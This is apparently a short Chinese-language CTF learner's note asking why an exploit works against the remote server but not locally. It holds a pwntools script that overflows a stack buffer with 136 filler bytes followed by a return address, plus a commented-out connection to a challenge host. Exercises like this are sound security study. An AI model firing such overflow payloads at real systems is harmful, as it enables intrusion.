+ 为什么这道题打本地打不通，打远程可以打通？

  ```python
  #!/bin/python3
  #coding:utf-8
  
  from pwn import *
  
  context.arch = "amd64"
  
  io = process("./291721f42a044f50a2aead748d539df0")
  # io = remote("220.249.52.133", 38481)
  
  retaddr = 0x400596
  
  payload = b'A' * 136 + p64(retaddr)
  if payload == flat([b'A' * 136, retaddr]):
      print("yes")
  else:
      print("no")
  io.send(payload)
  
  io.interactive()
  ```

  